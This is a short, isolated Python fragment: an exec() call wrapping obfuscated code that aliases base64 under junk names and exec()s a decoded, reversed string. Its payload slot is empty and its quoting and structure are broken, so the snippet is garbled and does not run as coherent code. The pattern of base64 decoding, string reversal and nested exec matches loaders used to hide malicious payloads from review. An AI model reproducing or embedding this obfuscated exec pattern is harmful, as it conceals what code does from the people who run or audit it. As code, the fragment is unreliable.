exec("import base64 as aW1wb3J0IG1hcn\naW1wb3J0IG1hcnNoY=aW1wb3J0IG1hcn.b64decode\nrange.__contains__\nexec(aW1wb3J0IG1hcnNoY(\''[::-1]+'\'))")